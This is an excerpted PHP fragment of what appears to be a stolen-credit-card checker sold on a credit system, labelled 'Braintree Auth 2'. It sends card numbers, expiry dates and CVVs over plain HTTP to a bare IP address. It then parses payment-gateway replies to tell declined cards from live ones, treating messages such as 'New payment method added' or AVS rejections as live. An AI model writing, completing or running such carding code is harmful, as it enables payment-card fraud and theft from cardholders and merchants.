...
if ($currentCredits < 1) { // Adjusted to 1 credit for Braintree Auth 2
...
$requestUrl = "http://206.206.78.217:1516/?cc={$cc}|{$month}|{$year}|{$cvv}";
...
$dead_responses = [
    ...
    "Not enough units of" => "Out of Stock",
    "Unable to create subscription.Please contact your bank" => "Declined",
...
if (
    ...
    (stripos($response, 'Nice! New payment method added') !== false) ||
    (stripos($response, 'Invalid postal code or street address.') !== false) ||
    (stripos($response, 'avs: Gateway Rejected: avs') !== false) ||
    (stripos($response, 'Duplicate card exists in the vault') !== false) ||
